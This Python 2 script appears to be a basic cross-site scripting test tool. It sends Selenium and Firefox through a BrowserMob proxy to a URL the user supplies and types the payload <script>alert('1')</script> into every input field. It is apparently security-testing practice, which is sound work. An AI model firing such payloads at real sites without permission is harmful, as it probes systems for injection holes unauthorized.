from browsermobproxy import Server
#Proxy server
server = Server("/root/Desktop/browsermob-proxy-2.1.0-beta-4/bin/browsermob-proxy")
server.start()
proxy = server.create_proxy()

from selenium import webdriver

#load what you want to test with (change to phantomjs later)
profile = webdriver.FirefoxProfile()
#Setup Proxy
profile.set_proxy(proxy.selenium_proxy())
driver = webdriver.Firefox(firefox_profile=profile)

print "Hola"

def getpage():
    URL = raw_input("Please enter the url you would like to visit \n")
    try:
        URL = str(URL)
    except ValueError:
        print "You need to enter a valid string "
    else:
        if URL.startswith("http://"):
            driver.get(URL)
        else:
            URL = "http://" + URL
            driver.get(URL)

def inputfiller():
    # Payload Variables
    PLOAD = "<script>alert('1')</script>"
    #Find inputs

    INPUT = driver.find_elements_by_tag_name("input")
    submit = driver.find_element_by_name("form")

    for i in INPUT:
        i.send_keys(PLOAD)


getpage()

inputfiller()
